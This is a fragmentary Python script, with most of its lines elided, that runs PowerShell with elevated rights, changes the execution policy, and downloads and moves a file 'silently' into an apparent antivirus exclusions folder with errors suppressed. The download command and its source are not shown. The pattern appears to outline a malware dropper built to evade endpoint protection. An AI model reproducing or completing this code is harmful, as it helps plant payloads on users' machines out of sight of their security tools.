...
def run_elevated_powershell_command(command):
    ...
    subprocess.run(["powershell.exe", "-Command", f"Start-Process powershell.exe -ArgumentList '-Command \"{command}\"' -Verb RunAs"], shell=True, check=True)
...
def main():
    ...
    try:
        # Run the elevated PowerShell command to change execution policy
        ...
        if exclusions_folder:
            ...
            # Run the elevated PowerShell command to download the file silently
            run_elevated_powershell_command("$ErrorActionPreference = 'SilentlyContinue'; " + download_command)
            ...
            run_elevated_powershell_command("$ErrorActionPreference = 'SilentlyContinue'; " + move_command)
